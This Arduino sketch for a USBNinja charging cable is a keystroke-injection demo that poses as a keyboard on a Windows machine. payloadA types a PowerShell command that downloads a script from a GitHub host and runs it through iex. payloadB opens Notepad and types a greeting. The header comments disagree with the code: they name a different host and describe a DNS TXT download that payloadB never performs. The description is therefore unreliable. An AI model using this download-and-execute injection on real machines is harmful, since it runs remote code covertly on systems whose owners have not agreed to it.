/*

Author:
  Keld Norman | @keld_norman

Description:
  You can watch the video of using this script: https://www.youtube.com/watch?v=L90VGpqBa7M

  payloadA() {}
    Once you press button A, the following happens:
    - Executing powershell to execute pony.ps script remotely form https://www.lostserver.com/static/pony.ps
    - The powershell script pony.ps downloads pony.jpg image from 'https://www.lostserver.com/static/pony.jpg then store it in a temp file.
    - Then change the background to the pony.jpg picture.

  payloadB() {}
    Once you press button B, the following happens:
      - Executing nslookup command to do a DNS TXT query to download a malicious file
      - The malicious file is going to be saved in '%UserProfile%\\Desktop\\eicar.com'

      The DNS txt record have to be made on your control panel for the domaine you own so you will get the correct txt string when asking with the nslookup program

*/

// #define LAYOUT_DANISH

#include <NinjaKeyboard.h>

void setup() {}

void loop() {}

void payloadA() {

    USBninjaOnline();

    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.println(F("powershell \" [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48; iwr https://raw.githubusercontent.com/xorred/atlantsecurity/master/usbNinjaDesktopReset.ps -UseBasicParsing | iex\""));
    NinjaKeyboard.end();

    USBninjaOffline();

    NinjaKeyboard.begin();
}

void payloadB() {

    USBninjaOnline();                                   

    NinjaKeyboard.begin();                              
    NinjaKeyboard.delay(1000);                          

    NinjaKeyboard.sendKeyStroke(0);                     //Send HID '0' to compatibility Win7.
    NinjaKeyboard.delay(1000);                          //Delay 1 second to wait system to recognize the NinjaKeyboard.

    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(100);                           
    NinjaKeyboard.print(F("notepad"));                  
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);

    NinjaKeyboard.println(F("Greetings!\n\nThis is just an example of remote control via a Charging Cable. A malicous hacker would do more."));
    NinjaKeyboard.delay(100);                           

    NinjaKeyboard.end();                                //Send Disconnect command to NinjaKeyboard USB Interface
    USBninjaOffline();                                  //USBNinja disappear. Cable Line back to normal.

    NinjaKeyboard.begin();                              //Restart Keyboard Interface while USB DATA
                                                        //was cut off. So you can use payloadB without ReEmulate NinjaKeyboard.
}
